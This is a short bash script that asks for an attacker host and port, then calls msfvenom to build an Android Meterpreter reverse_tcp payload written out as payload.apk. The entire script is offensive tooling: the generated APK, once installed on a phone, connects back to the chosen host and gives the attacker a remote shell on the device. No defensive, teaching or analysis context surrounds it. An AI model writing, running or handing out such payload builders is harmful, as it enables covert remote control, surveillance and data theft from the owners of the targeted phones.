#!/bin/bash

generate_payload() {
  OUTPUT_DIR="./output"
  mkdir -p "$OUTPUT_DIR"
  
  echo -ne "Enter LHOST: "
  read LHOST
  echo -ne "Enter LPORT: "
  read LPORT

  if msfvenom -p android/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -o "$OUTPUT_DIR/payload.apk"; then
    echo -e "${green}[LOG] Payload generated successfully at $OUTPUT_DIR/payload.apk${default}"
  else
    echo -e "${red}[ERROR] Failed to generate payload.${default}"
  fi
}
